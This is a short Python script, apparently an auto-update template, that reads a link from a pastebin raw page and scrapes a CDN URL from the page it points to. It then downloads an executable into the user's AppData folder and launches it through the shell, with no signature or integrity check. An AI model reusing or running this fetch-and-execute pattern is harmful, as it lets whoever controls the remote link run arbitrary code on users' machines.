#import library
from bs4 import BeautifulSoup
import re
import sys
import requests
import urllib.request
import subprocess
import time
import os

def check_update():
    update = requests.get("https://pastebin.com/raw/#1").json()["link"]
    path = os.path.expanduser('~')+f"\\AppData\\Local\\Programs\\#Programname.exe"
    if os.path.isfile(path):
        try:
            os.remove(path)
        except: pass
    content = requests.get(update).content
    soup = str(BeautifulSoup(content, "lxml"))
    soup = soup.split("\n")
    for text in soup:
        if "https://cdn" in text:
            pattern = "https?://[\w/:%#\$&\?\(\)~\.=\+\-]+"
            url = re.findall(pattern, text)[0]
    urllib.request.urlretrieve(url, path)
    time.sleep(3)
    subprocess.run(f"start {path}",shell=True)
    sys.exit()

check_update()